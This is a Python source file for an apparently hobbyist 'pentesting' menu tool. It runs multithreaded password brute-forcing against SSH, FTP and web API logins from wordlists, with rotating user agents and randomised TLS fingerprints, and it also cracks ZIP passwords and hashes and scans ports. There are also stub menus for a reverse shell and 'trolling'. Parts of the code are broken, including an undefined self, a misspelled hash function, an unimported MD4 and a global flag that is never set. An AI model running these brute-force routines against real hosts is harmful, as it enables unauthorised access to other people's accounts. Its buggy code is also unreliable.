import os, paramiko, threading, tls_client, random, hashlib, json, socket

from zipfile import ZipFile
from ftplib import FTP
from datetime import datetime
from pystyle import *

global cracked
cracked = False



class Utils:
    def Art():
        Utils.Clear()
        Utils.Title()
        ascii_art = """
 ╦╦ ╦╔═╗╔═╗
 ║║║║║╣ ║ ║
╚╝╚╩╝╚═╝╚═╝
        """
        print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(ascii_art)))
    def Clear():
        os.system("clear") if os.name != "nt" else os.system("cls")
    
    def Title(args=None):
        os.system("title jwe0") if args == None else os.system(f"title jwe0 ^| {args}")


    def load_lines(file):
        return [line for line in open(file).read().splitlines()]



    def random_useragent():
        return random.choice([agent for agent in open("Dep/Agents.txt").read().splitlines()])


    def load_config():
        with open("Dep/config.json") as f:
            configurations = json.load(f)

            iplookup = configurations.get("Iplookup-Key")


            return iplookup









class Bruteforcer:

    def check_ssh(ssh, host, username, password):
        try:
            ssh.connect(host, port=22, username=username, password=password)
            print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Host: {host}
[+] Username: {username}
[+] Password: {password}
""")
            ssh.close()
            cracked = True
        except:
            pass
            ssh.close()



    def check_ftp(ftp, host, username, password):
        try:
            ftp.login(username, password)
            print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Host: {host}
[+] Username: {username}
[+] Password: {password}
[+] Files: {', '.join(ftp.nlst())}
""")
            cracked = True
        except:
            pass

    def check_api_login(session, host, userheader, passheader, username, password, checktype, checkdata):
        useragent = Utils.random_useragent()

        request_data = {
            userheader : username,
            passheader : password
        }

        response = session.post(host, headers={"User-Agent" : useragent}, json=request_data)

        if checktype == "status":
            if response.status_code == int(checkdata):
                print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Host: {host}
[+] Username: {username}
[+] Password: {password}
""")
        elif checktype == "content":
            if checkdata in response.text:
                print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Host: {host}
[+] Username: {username}
[+] Password: {password}
""")






    def zip_open(zip, password):
        try:
            zip.extractall(pwd=password.encode())
            print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Password: {password}
""")
        except:
            pass


    def hash_check(algorithm, hash, password):
        if algorithm == "sha1":
            hashed_password = hashlib.sha1(self.password.encode()).hexdigest()
        elif algorithm == "sha224":
            hashed_password = hashlib.sha224(self.password.encode()).hexdigest()
        elif algorithm == "sha256":
            hashed_password = hashlib.sha256(self.password.encode()).hexdigest()
        elif algorithm == "sha384":
            hashed_password = hashlib.sha384(self.password.encode()).hexdigest()
        elif algorithm == "sha512":
            hashed_password = hashlib.sha512(self.password.encode()).hexdigest()
        elif algorithm == "sha3_224":
            hashed_password = hashlib.sha3_224(self.password.encode()).hexdigest()
        elif algorithm == "sha3_256":
            hashed_password = hashlib.sha3_256(self.password.encode()).hexdigest()
        elif algorithm == "sha3_384":
            hashed_password = hashlib.sha3_3844(self.password.encode()).hexdigest()
        elif algorithm == "sha3_512":
            hashed_password = hashlib.sha3_512(self.password.encode()).hexdigest()
        elif algorithm == "md4":
            hashed_password = MD4.new(self.password.encode('utf-16le')).hexdigest()
        elif algorithm == "md5":
            hashed_password = hashlib.md5(self.password.encode()).hexdigest()
        elif algorithm == "shake_128":
            hashed_password = hashlib.shake_128(self.password.encode()).hexdigest(16)
        elif algorithm == "shake_256":
            hashed_password = hashlib.shake_256(self.password.encode()).hexdigest(16)
        elif algorithm == "ntlm":
            hashed_password = MD4.new(self.password.encode('utf-16le')).digest().hex() 
        else:
            print("[!] Unrecognised hash")



        if hashed_password == hash:
            print(f"""\n
[+] CRACKED!!
[+] Current time: {datetime.now().strftime('%H:%M:%S')}
[+] Hash: {hash}
[+] Password: {password}
""")





class Exploits:


    def port_service(port):
        with open("Dep/Ports/common_ports.json") as f:
            common_ports = json.load(f)
        with open("Dep/Ports/registered_ports.json") as f:
            registered_ports = json.load(f)



        if str(port) in common_ports:
            service = common_ports[str(port)]["service"]
            protocol = common_ports[str(port)]["protocols"]

            return service, protocol

        elif str(port) in registered_ports:
            service = registered_ports[str(port)]["service"]
            protocol = registered_ports[str(port)]["protocols"]

            return service, protocol
        else:
            return "No service detected", "No protocol detected"


    def check_port(socket, ip, port):
        con = socket.connect_ex((ip, int(port)))
        if con == 0:
            serv, proto = Exploits.port_service(str(port))
            print(f"[PORT]\t\t{ip}:{str(port)}\t\t{serv}\t\t{proto}")




    def SSH_bruteforce():
        global cracked
        ip = input("[?] Target IP > ")
        usernames_file = input("[?] Users file > ")
        passwords_file = input("[?] Pass file > ")


        print("\n[+] Loading usernames from file...")
        usernames = Utils.load_lines(usernames_file)
        print("[+] Loading passwords from file...")
        passwords = Utils.load_lines(passwords_file)


        print("[+] Setting up ssh client...")
        ssh = paramiko.SSHClient()
        print("[+] Setting missing host key policy...")
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())



        print("[+] Starting exploit...\n")
        for username in usernames:
            if cracked == True:
                break
            for password in passwords:
                if cracked == True:
                    break
                print(f"[>] Attempting {username}:{password}", end='\r')
                threading.Thread(target=Bruteforcer.check_ssh, args=[ssh, ip, username, password]).start()
                



        input()
        cracked = False


    def FTP_bruteforce():
        global cracked
        host = input("[?] Host > ")
        usernames_file = input("[?] Users file > ")
        passwords_file = input("[?] Pass file > ")


        print("\n[+] Loading usernames from file...")
        usernames = Utils.load_lines(usernames_file)
        print("[+] Loading passwords from file...")
        passwords = Utils.load_lines(passwords_file)


        print("[+] Setting up ssh client...")
        ftp = FTP(host)

        print("[+] Starting exploit...\n")
        for username in usernames:
            if cracked == True:
                break
            for password in passwords:
                if cracked == True:
                    break
                print(f"[>] Attempting {username}:{password}", end='\r')
                threading.Thread(target=Bruteforcer.check_ftp, args=[ftp, host, username, password]).start()


        input()
        cracked = False



    def API_bruteforce():
        global cracked
        host = input("[?] Host > ")
        usernames_file = input("[?] Users file > ")
        passwords_file = input("[?] Pass file > ")

        username_header = input("[?] User header > ")
        password_header = input("[?] Pass header > ")

        checktype = input("[?] Check type > ")
        checkdata = input("[?] Check data > ")

        print("\n[+] Loading usernames from file...")
        usernames = Utils.load_lines(usernames_file)
        print("[+] Loading passwords from file...")
        passwords = Utils.load_lines(passwords_file)

        print("[+] Setting up tls client...")
        session = tls_client.Session(random_tls_extension_order=True)

        print("[+] Starting exploit...\n")
        for username in usernames:
            if cracked == True:
                break
            for password in passwords:
                if cracked == True:
                    break
                print(f"[>] Attempting {username}:{password}", end='\r')
                threading.Thread(target=Bruteforcer.check_api_login, args=[session, host, username_header, password_header, username, password, checktype, checkdata]).start()


        input()
        cracked = False


    def ZIP_bruteforce():
        global cracked
        file = input("[?] File > ")
        passwords_file = input("[?] Pass file > ")
        


        print("[+] Loading passwords from file...")
        passwords = Utils.load_lines(passwords_file)

        print("[+] Setting up zip client...")
        zip = ZipFile(file)

        print("[+] Starting exploit...\n")

        for password in passwords:
            if cracked == True:
                break
            print(f"[>] Attempting {password}", end='\r')
            threading.Thread(target=Bruteforcer.zip_open, args=[zip, password]).start()
            



        input()
        cracked = False



    def HASH_bruteforce():
        global cracked
        hash = input("[?] Hash > ")
        passwords_file = input("[?] Pass file > ")
        algorithm = input("[?] Algorithm > ")

        print("[+] Loading passwords from file...")
        passwords = Utils.load_lines(passwords_file)


        print("[+] Starting exploit...\n")

        for password in passwords:
            if cracked == True:
                break
            print(f"[>] Attempting {password}", end='\r')
            threading.Thread(target=Bruteforcer.hash_check, args=[algorithm, hash, password]).start()


        input()
        cracked = True


    def IP_lookup():
        api_token = Utils.load_config()
        ip = input("[?] IP > ")
        session = tls_client.Session(random_tls_extension_order=True)
        headers = {"User-Agent" : Utils.random_useragent()}
        ipinfo = session.get("https://api.ipgeolocation.io/ipgeo?apiKey={key}&ip={ip}".format(key=api_token, ip=ip), headers=headers)

        print("\n[+] Ipinfo\n")

        for key, value in ipinfo.json().items():
            if isinstance(value, str):
                print(f"[+] {key[0].upper()}{key[1:]} <?> {value}")
            

        input()


    def Portscan():
        ip = input("[?] Ip > ")
        ending_port = input("[?] End port > ")

        

        for i in range(int(ending_port)):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            threading.Thread(target=Exploits.check_port, args=[s, ip, i + 1]).start()
            print(f"[PROGRESS] ( {ip}:{str(i + 1)} )", end='\r')

        input()


    def Reverse_DNS():
        ip = input("[?] Domain > ")
        print(f"[+] {socket.gethostbyname(ip)}")
        input()


class SubSections:
    def Bruteforcing():
        Utils.Art()
        options = """
<  Online  > <  Offline  >

[1] SSH      [4] ZIP
[2] FTP      [5] HASH
[3] API 
        
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Pentesting/Bruteforcing] : ")
        match selection:
            case "1":
                Exploits.SSH_bruteforce()
            case "2":
                Exploits.FTP_bruteforce()
            case "3":
                Exploits.API_bruteforce()
            case "4":
                Exploits.ZIP_bruteforce()
            case "5":
                Exploits.HASH_bruteforce()


    def Osint():
        Utils.Art()
        options = """
[1] Iplookup      
[2] Phone lookup     
[3] Email lookup
        
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Pentesting/Osint] : ")
        match selection:
            case "1":
                Exploits.IP_lookup()

    def Enumeration():
        Utils.Art()
        options = """
[1] Port scan
[2] Reverse DNS

        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Pentesting/Enumeration] : ")
        match selection:
            case "1":
                Exploits.Portscan()
            case "2":
                Exploits.Reverse_DNS()

    def Debugging():
        Utils.Art()
        options = """
[1] Socket debugger
[2] Api debugger
        
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Pentesting/Debugging] : ")

    def Exploits():
        Utils.Art()
        options = """
[1] Reverse shell
        
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Pentesting/Exploits] : ")















class Sections:

    def Main():
        Utils.Art()


        options = """
    [1] > Pentesting
    [2] > Trolling
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Main] : ")

        match selection:
            case "1":
                Sections.Pentesting()
            case "2":
                Sections.Trolling()




    def Pentesting():
        Utils.Art()
        options = """
[1] > Bruteforcing
[2] > Osint
[3] > Enumeration
[4] > Debugging
[5] > Exploits
        """
        print(Center.XCenter(options))

        selection = input(f"[{os.getlogin()}@Pentesting] : ")

        match selection:
            case "1":
                SubSections.Bruteforcing()
            case "2":
                SubSections.Osint()
            case "3":
                SubSections.Enumeration()
            case "4":
                SubSections.Debugging()
            case "5":
                SubSections.Exploits()





    def Trolling():
        Utils.Art()
        options = """
[1] > Cum
        
        """
        print(Center.XCenter(options))
        selection = input(f"[{os.getlogin()}@Trolling] : ")












if __name__ == "__main__":
    while True:
        Sections.Main()